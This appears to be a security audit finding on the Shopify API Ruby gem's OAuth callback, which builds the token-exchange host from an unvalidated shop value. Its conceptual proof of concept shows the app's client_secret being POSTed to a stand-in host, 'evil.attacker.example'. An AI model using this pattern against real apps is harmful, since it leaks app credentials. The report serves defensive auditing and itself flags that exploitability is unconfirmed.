### Title
OAuth callback sends `client_secret` to an attacker-influenced host because `auth_query.shop` is never passed through `ShopValidator.sanitize!` before building the token-exchange request URL - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses the caller-supplied `auth_query.shop` value directly as the `Session#shop` used by `Clients::HttpClient`, which derives its request host from `session.shop` with no domain check. Every other credential-exchange entry point in the gem (`ClientCredentials`, `RefreshToken`, `TokenExchange`) explicitly calls `Utils::ShopValidator.sanitize!` on the shop value before building a session/host from it, but `Oauth.validate_auth_callback` does not.

### Finding Description
In `validate_auth_callback`: [1](#0-0) 
the shop value is taken straight from `auth_query.shop` and used to build `null_session = Auth::Session.new(shop: auth_query.shop)`, which is then handed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`. `HttpClient#initialize` builds the outbound request host directly from `session.shop`: [2](#0-1) 
with no domain allow-listing. The POST body sent to that derived host contains `client_id`, `client_secret`, and the authorization `code`: [3](#0-2) 

Compare this to the other three OAuth-adjacent flows in the same library, which all call `Utils::ShopValidator.sanitize!(shop)` — restricting `shop` to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) — before constructing the session/host that will receive `client_secret`: [4](#0-3) [5](#0-4) [6](#0-5) 

The relevant identity binding that should hold is: **host that receives `client_secret` == a validated `*.myshopify.com`/trusted Shopify domain**. In `validate_auth_callback` this equality is never checked — the binding used instead is only "HMAC over the query params validates" (`Utils::HmacValidator.validate(auth_query)`), which authenticates that the *query string as a whole* was signed with `api_secret_key`, but says nothing about whether `shop` is restricted to Shopify's domain space. The `to_signable_string` used for the HMAC simply URL-encodes whatever `shop` value was supplied: [7](#0-6) 

### Impact Explanation
If a host application constructs `AuthQuery` from callback request parameters (as the gem's own documentation instructs) and any surrounding layer that produces the signature does not itself independently enforce a `myshopify.com` domain check on `shop`, `validate_auth_callback` will send the app's `client_secret` (plus the authorization `code`) to `https://<shop>/admin/oauth/access_token`, where `<shop>` is not verified to be a Shopify-owned domain. This maps to the report's core bug class ("field trusted for a security-relevant action is not actually bound/validated the way the surrounding code assumes") and lands squarely in the SSRF-with-app-credentials impact category: `client_secret` exfiltration to an attacker-controlled host, plus loss of the authorization `code` (which can potentially be exchanged for an access token if it hasn't been consumed). This is inconsistent with the rest of the gem's own defense-in-depth pattern (`sanitize!` before host derivation), which is present everywhere else the library builds a host from a `shop` string.

### Likelihood Explanation
Exploitability depends entirely on whether an attacker can get `validate_auth_callback` invoked with a `shop` value outside `myshopify.com`/`myshopify.io` while still producing a `hmac` that passes `Utils::HmacValidator.validate`. Since HMAC validation requires knowledge of `api_secret_key`, an attacker cannot forge an arbitrary `shop`+`hmac` pair on their own. This makes the finding likelihood-limited to scenarios where Shopify itself (or an upstream trusted party) would sign a callback for a non-myshopify `shop` value, or where the host application's own callback wiring passes through an unsanitized `shop` before the HMAC check runs against parameters an attacker partially controls. I was not able to fully verify from the in-scope library code alone whether Shopify's real authorize/callback flow can be induced to sign a non-`myshopify.com` `shop` value, so likelihood is uncertain and depends on the completeness of the actual protection provided elsewhere. What is concretely verifiable, however, is that this code path is the one exception in this codebase where a `shop`-derived host receiving `client_secret` is built without calling `ShopValidator.sanitize!`, unlike `ClientCredentials`, `RefreshToken`, and `TokenExchange`.

### Recommendation
In `ShopifyAPI::Auth::Oauth.validate_auth_callback`, call `Utils::ShopValidator.sanitize!(auth_query.shop)` (mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`) and use the validated/sanitized shop value when constructing `null_session` and the final `Session.from(shop: ...)`, rejecting the callback with `Errors::InvalidShopError` if the shop domain is untrusted, before any network request that would carry `client_secret` is issued.

### Proof of Concept
Conceptual PoC (illustrating the missing check, not a demonstrated exploit against a real HMAC bypass):
1. Construct `ShopifyAPI::Auth::Oauth::AuthQuery.new(code: "...", shop: "evil.attacker.example", timestamp: ..., state: ..., host: ..., hmac: <valid hmac computed over these exact params with the app's api_secret_key>)`.
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
3. `Utils::HmacValidator.validate(auth_query)` passes because it only checks that the HMAC matches `to_signable_string` (code/host/shop/state/timestamp) against `api_secret_key` — it does not check that `shop` is a `*.myshopify.com` domain.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "evil.attacker.example"), base_path: "/admin/oauth")` builds `@base_uri = "https://evil.attacker.example"`.
5. `client.request(...)` POSTs `{client_id, client_secret, code, expiring}` to `https://evil.attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret`.

Note: Step 1's premise (obtaining a validly-signed `hmac` for an attacker-chosen `shop`) is the part I could not verify is achievable by an unprivileged external attacker using only this repository's code — that would require either a weakness in Shopify's own callback-issuance process or a host application flaw upstream of this gem. Given the strict scope rules excluding findings that require the host app to misuse the documented API, and given I could not conclusively establish an attacker-reachable path to a validly-signed non-myshopify `shop`, I flag this as the closest legitimate analog but with unresolved exploitability, rather than a confirmed critical/high finding.

```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```
